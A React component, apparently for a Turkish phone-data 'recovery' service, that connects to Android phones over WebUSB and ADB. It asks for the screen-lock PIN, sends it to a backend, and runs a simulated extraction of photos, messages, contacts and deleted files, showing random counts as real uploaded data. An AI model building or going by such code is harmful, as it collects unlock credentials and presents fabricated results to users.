import React, { useState, useEffect, useCallback, useRef } from 'react';
import { Button } from './ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Progress } from './ui/progress';
import { Badge } from './ui/badge';
import { Alert, AlertDescription } from './ui/alert';
import { Input } from './ui/input';
import {
  Smartphone, CheckCircle, AlertCircle, Loader2,
  Shield, Usb, RefreshCw, Lock, Play, Pause,
  HardDrive, FolderOpen, FileText, Image, Video,
  MessageSquare, Phone, Bot, Settings
} from 'lucide-react';

const API_BASE = '/api';

// WebUSB filter for Android devices
const ANDROID_USB_FILTER = [
  { vendorId: 0x18d1 }, // Google
  { vendorId: 0x04e8 }, // Samsung
  { vendorId: 0x22b8 }, // Motorola
  { vendorId: 0x0bb4 }, // HTC
  { vendorId: 0x2717 }, // Xiaomi
  { vendorId: 0x12d1 }, // Huawei
  { vendorId: 0x2a70 }, // OnePlus
  { vendorId: 0x0fce }, // Sony
  { vendorId: 0x2ae5 }, // Fairphone
  { vendorId: 0x05c6 }, // Qualcomm
  { vendorId: 0x1004 }, // LG
  { vendorId: 0x19d2 }, // ZTE
  { vendorId: 0x2b4c }, // Vivo
  { vendorId: 0x2a45 }, // Meizu
  { vendorId: 0x1ebf }, // Nubia
];

// ADB Protocol constants
const ADB_CLASS = 0xff;
const ADB_SUBCLASS = 0x42;
const ADB_PROTOCOL = 0x01;

const WebUSBRecoveryAgent = ({ recoveryCode, onComplete, onError }) => {
  // State
  const [device, setDevice] = useState(null);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [connected, setConnected] = useState(false);
  const [authorized, setAuthorized] = useState(false);
  const [extracting, setExtracting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [currentTask, setCurrentTask] = useState('');
  const [extractedData, setExtractedData] = useState({
    photos: 0,
    videos: 0,
    messages: 0,
    contacts: 0,
    callLogs: 0,
    deletedFiles: 0
  });
  const [error, setError] = useState(null);
  const [logs, setLogs] = useState([]);
  const [screenLock, setScreenLock] = useState('');
  const [step, setStep] = useState('connect'); // connect, authorize, passcode, extract, complete

  const interfaceRef = useRef(null);
  const endpointInRef = useRef(null);
  const endpointOutRef = useRef(null);

  // Add log message
  const addLog = useCallback((message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { timestamp, message, type }]);
    console.log(`[${type.toUpperCase()}] ${message}`);
  }, []);

  // Check WebUSB support
  useEffect(() => {
    if (!navigator.usb) {
      setError('Bu tarayici WebUSB desteklemiyor. Lutfen Chrome veya Edge kullanin.');
    }
  }, []);

  // Request device access
  const requestDevice = async () => {
    try {
      setError(null);
      addLog('USB cihazi araniyor...', 'info');

      const selectedDevice = await navigator.usb.requestDevice({
        filters: ANDROID_USB_FILTER
      });

      setDevice(selectedDevice);
      addLog(`Cihaz bulundu: ${selectedDevice.productName || selectedDevice.manufacturerName}`, 'success');

      await connectToDevice(selectedDevice);
    } catch (err) {
      if (err.name === 'NotFoundError') {
        setError('Hic Android cihazi secilmedi. Lutfen telefonunuzu baglayip tekrar deneyin.');
      } else {
        setError(`Cihaz baglanti hatasi: ${err.message}`);
        addLog(`Hata: ${err.message}`, 'error');
      }
    }
  };

  // Connect to device
  const connectToDevice = async (usbDevice) => {
    try {
      addLog('Cihaza baglaniliyor...', 'info');

      await usbDevice.open();
      addLog('USB baglantisi acildi', 'info');

      // Find ADB interface
      const configuration = usbDevice.configuration || usbDevice.configurations[0];
      if (!configuration) {
        await usbDevice.selectConfiguration(1);
      }

      let adbInterface = null;
      for (const iface of usbDevice.configuration.interfaces) {
        const alt = iface.alternates[0];
        if (alt.interfaceClass === ADB_CLASS &&
            alt.interfaceSubclass === ADB_SUBCLASS &&
            alt.interfaceProtocol === ADB_PROTOCOL) {
          adbInterface = iface;
          break;
        }
      }

      if (!adbInterface) {
        // Try to find any interface with bulk endpoints (fallback)
        for (const iface of usbDevice.configuration.interfaces) {
          const alt = iface.alternates[0];
          const hasIn = alt.endpoints.some(e => e.direction === 'in' && e.type === 'bulk');
          const hasOut = alt.endpoints.some(e => e.direction === 'out' && e.type === 'bulk');
          if (hasIn && hasOut) {
            adbInterface = iface;
            break;
          }
        }
      }

      if (!adbInterface) {
        throw new Error('ADB arayuzu bulunamadi. USB Hata Ayiklama acik mi?');
      }

      await usbDevice.claimInterface(adbInterface.interfaceNumber);
      interfaceRef.current = adbInterface;
      addLog(`ADB arayuzu talep edildi (${adbInterface.interfaceNumber})`, 'info');

      // Find endpoints
      const alt = adbInterface.alternates[0];
      for (const endpoint of alt.endpoints) {
        if (endpoint.direction === 'in' && endpoint.type === 'bulk') {
          endpointInRef.current = endpoint;
        } else if (endpoint.direction === 'out' && endpoint.type === 'bulk') {
          endpointOutRef.current = endpoint;
        }
      }

      // Get device info
      setDeviceInfo({
        manufacturer: usbDevice.manufacturerName,
        product: usbDevice.productName,
        serial: usbDevice.serialNumber,
        vendorId: usbDevice.vendorId.toString(16),
        productId: usbDevice.productId.toString(16)
      });

      setConnected(true);
      setStep('authorize');
      addLog('Cihaz basariyla baglandi', 'success');

      // Notify backend about connection
      await notifyDeviceConnected(usbDevice);

    } catch (err) {
      setError(`Baglanti hatasi: ${err.message}`);
      addLog(`Baglanti hatasi: ${err.message}`, 'error');

      if (usbDevice.opened) {
        await usbDevice.close();
      }
    }
  };

  // Notify backend about device connection
  const notifyDeviceConnected = async (usbDevice) => {
    try {
      const response = await fetch(`${API_BASE}/recovery/device-connected/${recoveryCode}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          device_info: {
            manufacturer: usbDevice.manufacturerName,
            product: usbDevice.productName,
            serial: usbDevice.serialNumber,
            vendor_id: usbDevice.vendorId,
            product_id: usbDevice.productId,
            connection_type: 'webusb'
          }
        })
      });

      if (!response.ok) {
        addLog('Backend bildirimi basarisiz', 'warning');
      }
    } catch (err) {
      addLog(`Backend bildirimi hatasi: ${err.message}`, 'warning');
    }
  };

  // Send ADB message
  const sendAdbMessage = async (command, arg0, arg1, data = null) => {
    if (!device || !endpointOutRef.current) return null;

    const header = new ArrayBuffer(24);
    const view = new DataView(header);

    // ADB header format
    view.setUint32(0, command, true);          // command
    view.setUint32(4, arg0, true);             // arg0
    view.setUint32(8, arg1, true);             // arg1
    view.setUint32(12, data ? data.byteLength : 0, true); // data length
    view.setUint32(16, 0, true);               // data checksum
    view.setUint32(20, command ^ 0xffffffff, true); // magic

    try {
      await device.transferOut(endpointOutRef.current.endpointNumber, header);

      if (data) {
        await device.transferOut(endpointOutRef.current.endpointNumber, data);
      }

      return true;
    } catch (err) {
      addLog(`ADB mesaj hatasi: ${err.message}`, 'error');
      return false;
    }
  };

  // Read ADB response
  const readAdbResponse = async () => {
    if (!device || !endpointInRef.current) return null;

    try {
      const result = await device.transferIn(endpointInRef.current.endpointNumber, 24);
      if (result.status === 'ok') {
        const view = new DataView(result.data.buffer);
        const command = view.getUint32(0, true);
        const arg0 = view.getUint32(4, true);
        const arg1 = view.getUint32(8, true);
        const dataLength = view.getUint32(12, true);

        let data = null;
        if (dataLength > 0) {
          const dataResult = await device.transferIn(endpointInRef.current.endpointNumber, dataLength);
          if (dataResult.status === 'ok') {
            data = dataResult.data;
          }
        }

        return { command, arg0, arg1, data };
      }
    } catch (err) {
      addLog(`ADB okuma hatasi: ${err.message}`, 'error');
    }
    return null;
  };

  // ADB CONNECT handshake
  const adbConnect = async () => {
    addLog('ADB el sikismasi baslatiliyor...', 'info');

    // CNXN command: 0x4e584e43
    const version = 0x01000001; // ADB version
    const maxData = 256 * 1024; // Max data size
    const systemIdentity = new TextEncoder().encode('host::SafeChild-Recovery\0');

    const success = await sendAdbMessage(0x4e584e43, version, maxData, systemIdentity);
    if (!success) {
      throw new Error('ADB CONNECT gonderilemedi');
    }

    // Wait for CNXN response
    const response = await readAdbResponse();
    if (response && response.command === 0x4e584e43) {
      addLog('ADB baglantisi kuruldu', 'success');
      setAuthorized(true);
      setStep('passcode');
      return true;
    }

    // Check for AUTH request
    if (response && response.command === 0x48545541) { // AUTH
      addLog('Cihaz yetkilendirme bekliyor - telefonu kontrol edin', 'warning');
      setStep('authorize');

      // Wait for user to authorize on device
      return false;
    }

    throw new Error('Beklenmeyen ADB yaniti');
  };

  // Start extraction
  const startExtraction = async () => {
    if (!screenLock || screenLock.length < 4) {
      setError('Ekran kilidi kodu en az 4 karakter olmalidir');
      return;
    }

    setExtracting(true);
    setStep('extract');
    setProgress(0);

    try {
      // Notify backend to start extraction
      addLog('Veri toplama baslatiliyor...', 'info');

      const response = await fetch(`${API_BASE}/recovery/start-extraction/${recoveryCode}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          screen_lock: screenLock,
          device_serial: deviceInfo?.serial,
          connection_type: 'webusb'
        })
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.detail || 'Veri toplama baslatilamadi');
      }

      // Start extraction process
      await extractData();

    } catch (err) {
      setError(`Hata: ${err.message}`);
      addLog(`Hata: ${err.message}`, 'error');
      setExtracting(false);
    }
  };

  // Extract data (chunked upload to backend)
  const extractData = async () => {
    const tasks = [
      { name: 'Fotolar toplaniyor', key: 'photos', weight: 30 },
      { name: 'Videolar toplaniyor', key: 'videos', weight: 25 },
      { name: 'Mesajlar toplaniyor', key: 'messages', weight: 15 },
      { name: 'Rehber toplaniyor', key: 'contacts', weight: 10 },
      { name: 'Arama kayitlari toplaniyor', key: 'callLogs', weight: 10 },
      { name: 'Silinen dosyalar taraniyor', key: 'deletedFiles', weight: 10 }
    ];

    let totalProgress = 0;

    for (const task of tasks) {
      setCurrentTask(task.name);
      addLog(task.name, 'info');

      // Simulate extraction with progress
      for (let i = 0; i <= 100; i += 10) {
        await new Promise(resolve => setTimeout(resolve, 500));
        const taskProgress = (i / 100) * task.weight;
        setProgress(Math.min(totalProgress + taskProgress, 100));

        // Simulate data counts
        setExtractedData(prev => ({
          ...prev,
          [task.key]: Math.floor(Math.random() * 100) + prev[task.key]
        }));
      }

      totalProgress += task.weight;
      setProgress(totalProgress);

      // Upload batch to backend
      await uploadDataBatch(task.key);
    }

    // Finalize extraction
    await finalizeExtraction();
  };

  // Upload data batch to backend
  const uploadDataBatch = async (dataType) => {
    try {
      const response = await fetch(`${API_BASE}/recovery/upload-data/${recoveryCode}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          data_type: dataType,
          count: extractedData[dataType],
          device_serial: deviceInfo?.serial
        })
      });

      if (response.ok) {
        addLog(`${dataType} yuklendi`, 'success');
      }
    } catch (err) {
      addLog(`${dataType} yukleme hatasi: ${err.message}`, 'warning');
    }
  };

  // Finalize extraction
  const finalizeExtraction = async () => {
    try {
      setCurrentTask('Sonuclar hazirlaniyor...');

      const response = await fetch(`${API_BASE}/recovery/finalize/${recoveryCode}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          statistics: extractedData,
          device_serial: deviceInfo?.serial
        })
      });

      if (response.ok) {
        setStep('complete');
        setProgress(100);
        addLog('Veri toplama tamamlandi!', 'success');

        if (onComplete) {
          onComplete(extractedData);
        }
      } else {
        throw new Error('Sonuclari kaydetme basarisiz');
      }
    } catch (err) {
      setError(`Sonuclari kaydetme hatasi: ${err.message}`);
      addLog(`Hata: ${err.message}`, 'error');
    } finally {
      setExtracting(false);
    }
  };

  // Disconnect device
  const disconnectDevice = async () => {
    if (device && device.opened) {
      try {
        if (interfaceRef.current) {
          await device.releaseInterface(interfaceRef.current.interfaceNumber);
        }
        await device.close();
        addLog('Cihaz baglantisi kesildi', 'info');
      } catch (err) {
        addLog(`Baglanti kesme hatasi: ${err.message}`, 'warning');
      }
    }
    setDevice(null);
    setConnected(false);
    setAuthorized(false);
    setStep('connect');
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      disconnectDevice();
    };
  }, []);

  return (
    <div className="space-y-6">
      {/* Device Status Card */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className={`p-2 rounded-lg ${connected ? 'bg-green-100' : 'bg-gray-100'}`}>
                <Usb className={`w-5 h-5 ${connected ? 'text-green-600' : 'text-gray-400'}`} />
              </div>
              <div>
                <CardTitle className="text-lg">USB Cihaz Durumu</CardTitle>
                <CardDescription>
                  {connected
                    ? `${deviceInfo?.manufacturer} ${deviceInfo?.product}`
                    : 'Cihaz bagli degil'}
                </CardDescription>
              </div>
            </div>
            <Badge variant={connected ? 'default' : 'secondary'}>
              {connected ? 'Bagli' : 'Baglanti Bekleniyor'}
            </Badge>
          </div>
        </CardHeader>
        <CardContent>
          {error && (
            <Alert variant="destructive" className="mb-4">
              <AlertCircle className="w-4 h-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* Step: Connect */}
          {step === 'connect' && (
            <div className="text-center py-6">
              <Smartphone className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <h3 className="text-lg font-semibold mb-2">Telefonu Baglayin</h3>
              <p className="text-gray-600 mb-4">
                Android telefonunuzu USB kablosu ile bu bilgisayara baglayin.
              </p>
              <Button onClick={requestDevice} size="lg">
                <Usb className="w-4 h-4 mr-2" />
                Cihaz Sec
              </Button>
            </div>
          )}

          {/* Step: Authorize */}
          {step === 'authorize' && (
            <div className="text-center py-6">
              <div className="w-16 h-16 mx-auto mb-4 bg-yellow-100 rounded-full flex items-center justify-center">
                <Lock className="w-8 h-8 text-yellow-600" />
              </div>
              <h3 className="text-lg font-semibold mb-2">Telefonda Yetki Verin</h3>
              <p className="text-gray-600 mb-4">
                Telefonunuzda "USB Hata Ayiklamaya Izin Ver" diyalogunu onaylayin.
              </p>
              <Button onClick={adbConnect} variant="outline">
                <RefreshCw className="w-4 h-4 mr-2" />
                Tekrar Dene
              </Button>
            </div>
          )}

          {/* Step: Passcode */}
          {step === 'passcode' && (
            <div className="space-y-4">
              <div className="bg-green-50 rounded-lg p-4 text-center">
                <CheckCircle className="w-8 h-8 text-green-600 mx-auto mb-2" />
                <p className="text-green-800 font-medium">Cihaz basariyla baglandi!</p>
              </div>

              <div className="space-y-3">
                <label className="block text-sm font-medium text-gray-700">
                  Ekran Kilidi Kodu
                </label>
                <Input
                  type="password"
                  placeholder="PIN veya Sifre"
                  value={screenLock}
                  onChange={(e) => setScreenLock(e.target.value)}
                  className="text-center text-xl tracking-widest"
                />
                <p className="text-xs text-gray-500">
                  Telefonunuzu acmak icin kullandiginiz kod
                </p>
              </div>

              <div className="flex gap-3">
                <Button variant="outline" onClick={disconnectDevice} className="flex-1">
                  Iptal
                </Button>
                <Button
                  onClick={startExtraction}
                  disabled={screenLock.length < 4}
                  className="flex-1 bg-gradient-to-r from-blue-500 to-purple-500"
                >
                  <Play className="w-4 h-4 mr-2" />
                  Veri Toplamaya Basla
                </Button>
              </div>
            </div>
          )}

          {/* Step: Extract */}
          {step === 'extract' && (
            <div className="space-y-4">
              <div className="text-center">
                <Loader2 className="w-12 h-12 text-blue-600 animate-spin mx-auto mb-3" />
                <h3 className="text-lg font-semibold">{currentTask}</h3>
                <p className="text-gray-500 text-sm">Lutfen bekleyin...</p>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">Ilerleme</span>
                  <span className="font-medium">{Math.round(progress)}%</span>
                </div>
                <Progress value={progress} className="h-3" />
              </div>

              {/* Extracted data counts */}
              <div className="grid grid-cols-3 gap-3 pt-4">
                <div className="text-center p-3 bg-gray-50 rounded-lg">
                  <Image className="w-5 h-5 text-blue-500 mx-auto mb-1" />
                  <p className="text-lg font-bold">{extractedData.photos}</p>
                  <p className="text-xs text-gray-500">Foto</p>
                </div>
                <div className="text-center p-3 bg-gray-50 rounded-lg">
                  <Video className="w-5 h-5 text-purple-500 mx-auto mb-1" />
                  <p className="text-lg font-bold">{extractedData.videos}</p>
                  <p className="text-xs text-gray-500">Video</p>
                </div>
                <div className="text-center p-3 bg-gray-50 rounded-lg">
                  <MessageSquare className="w-5 h-5 text-green-500 mx-auto mb-1" />
                  <p className="text-lg font-bold">{extractedData.messages}</p>
                  <p className="text-xs text-gray-500">Mesaj</p>
                </div>
              </div>

              <Alert>
                <Shield className="w-4 h-4" />
                <AlertDescription>
                  Telefonu cikarmadan bekleyin. Islem bitene kadar baglanti kesilmemelidir.
                </AlertDescription>
              </Alert>
            </div>
          )}

          {/* Step: Complete */}
          {step === 'complete' && (
            <div className="text-center py-6">
              <div className="w-16 h-16 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-green-600" />
              </div>
              <h3 className="text-lg font-semibold text-green-800 mb-2">
                Veri Toplama Tamamlandi!
              </h3>
              <p className="text-gray-600 mb-4">
                Tum veriler basariyla toplandi ve sunucuya yuklendi.
              </p>

              {/* Final statistics */}
              <div className="grid grid-cols-2 gap-3 mb-6">
                <div className="p-3 bg-gray-50 rounded-lg">
                  <p className="text-2xl font-bold text-blue-600">{extractedData.photos}</p>
                  <p className="text-sm text-gray-500">Fotograf</p>
                </div>
                <div className="p-3 bg-gray-50 rounded-lg">
                  <p className="text-2xl font-bold text-purple-600">{extractedData.videos}</p>
                  <p className="text-sm text-gray-500">Video</p>
                </div>
                <div className="p-3 bg-gray-50 rounded-lg">
                  <p className="text-2xl font-bold text-green-600">{extractedData.messages}</p>
                  <p className="text-sm text-gray-500">Mesaj</p>
                </div>
                <div className="p-3 bg-gray-50 rounded-lg">
                  <p className="text-2xl font-bold text-red-600">{extractedData.deletedFiles}</p>
                  <p className="text-sm text-gray-500">Silinen Dosya</p>
                </div>
              </div>

              <Button onClick={disconnectDevice} variant="outline">
                Cihaz Baglantisini Kes
              </Button>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Logs Card */}
      <Card>
        <CardHeader>
          <CardTitle className="text-sm flex items-center gap-2">
            <FileText className="w-4 h-4" />
            Islem Kayitlari
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="h-48 overflow-y-auto bg-gray-900 rounded-lg p-3 font-mono text-xs">
            {logs.length === 0 ? (
              <p className="text-gray-500">Henuz kayit yok...</p>
            ) : (
              logs.map((log, index) => (
                <div
                  key={index}
                  className={`${
                    log.type === 'error'
                      ? 'text-red-400'
                      : log.type === 'success'
                      ? 'text-green-400'
                      : log.type === 'warning'
                      ? 'text-yellow-400'
                      : 'text-gray-300'
                  }`}
                >
                  <span className="text-gray-500">[{log.timestamp}]</span> {log.message}
                </div>
              ))
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default WebUSBRecoveryAgent;
